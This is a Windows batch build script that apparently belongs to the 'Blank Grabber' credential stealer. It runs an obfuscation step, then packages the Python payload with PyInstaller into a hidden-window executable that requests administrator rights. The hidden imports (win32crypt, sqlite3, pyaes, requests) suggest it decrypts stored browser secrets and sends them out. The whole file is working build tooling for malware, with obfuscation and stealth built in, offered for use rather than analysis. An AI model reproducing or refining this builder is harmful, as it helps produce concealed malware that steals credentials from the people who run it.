@echo off
if not exist activate.bat exit
title Obfuscating...
python ooo.py
title Converting to exe...
goto convert
:icon
pyinstaller --onefile --noconsole --noconfirm --uac-admin main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=pyaes --add-data "structc.pyd;."
goto done
:noicon
pyinstaller --onefile --noconsole --noconfirm --uac-admin main-o.py --name "Blank Grabber" --clean --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --hidden-import=pyaes --add-data "structc.pyd;."
goto done
:convert
if exist icon.ico goto icon
goto noicon
:done
cls
title Opening Folder...
explorer.exe dist
exit